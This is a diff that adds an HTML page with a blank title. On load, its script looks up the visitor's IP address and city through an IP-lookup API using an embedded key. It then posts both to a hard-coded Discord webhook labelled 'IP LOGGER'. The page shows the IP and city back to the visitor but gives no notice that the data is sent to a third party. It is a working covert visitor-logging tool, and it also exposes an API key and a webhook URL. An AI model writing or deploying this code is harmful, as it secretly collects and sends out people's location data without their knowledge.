@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title></title>
+</head>
+
+
+<body>
+    <script>
+            function json(url) {
+        return fetch(url).then(res => res.json());
+      }
+
+      let apiKey = '4d6482cfaf424c6839a887ec27beadf6676094c673288e14a1092f46';
+      json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
+        console.log(data.ip);
+        console.log(data.city);
+        document.getElementById("ip").innerHTML = data.ip;
+        document.getElementById("city").innerHTML = data.city;
+        const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/917736558105341972/XUCDyFwGbkq8exVbokJnfz9rCmMtPjIhKyWT8B1cdbMPGhJkEVxYU4doaFOA-iHuE8zl");
+
+      request.setRequestHeader('Content-type', 'application/json');
+      function hexToDecimal(hex) {
+  return parseInt(hex.replace("#",""), 16)
+}
+var myEmbed = {
+  author: {
+    name: "IP LOGGER"
+  },
+  description: `**IP:** ${data.ip}\n**CITY:** ${data.city}`,
+  color: hexToDecimal("#00bfff")
+}
+var params = {
+  username: "IP LOGGER",
+  avatar_url: "https://fv2-5.failiem.lv/thumb_show.php?i=jmef7627q&view",
+  embeds: [ myEmbed ]
+}
+      request.send(JSON.stringify(params));
+    
+      });
+</script>
+<center><h1 id="ip"></h1><h1 id="city"></h1></center>
+
+</body>
+</html>
